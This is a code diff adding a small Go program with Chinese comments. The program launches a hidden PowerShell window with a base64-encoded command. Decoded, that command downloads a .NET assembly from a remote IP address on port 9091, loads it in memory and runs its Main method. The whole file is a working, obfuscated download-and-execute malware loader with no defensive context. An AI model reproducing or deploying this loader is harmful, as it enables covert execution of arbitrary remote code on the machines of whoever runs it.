@@ -1,0 +1,20 @@
+package main
+
+import (
+	// "fmt"
+	"os/exec"
+)
+
+func main() {
+	var encodedCmd string
+	encodedCmd = "JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABiAHkAdABlAHMAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAIgBoAHQAdABwADoALwAvADEAMAAwAC4AMQAuADEALgAxADMAOAA6ADkAMAA5ADEALwBkAG8AdwBuAGwAbwBhAGQALwBjAHMAaABhAHIAcAAvACIAKQA7ACQAYQBzAHMAZQBtAGIAbAB5AD0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AGwAbwBhAGQAKAAkAGIAeQB0AGUAcwApADsAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAIgBQAHIAbwBnAHIAYQBtACIAKQAuAEcAZQB0AE0AZQB0AGgAbwBkACgAIgBNAGEAaQBuACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAIAAkAG4AdQBsAGwAKQA7AA=="
+	// 创建一个 CMD 执行  powershell -noP -sta -w 1 -enc
+	cmd := exec.Command("cmd", "/c", "powershell", "-w", "1", "-enc", encodedCmd)
+
+	// 运行 cmd
+	err := cmd.Run()
+	if err != nil {
+		// // log.Fatal(err)
+		// fmt.Println(err)
+	}
+}
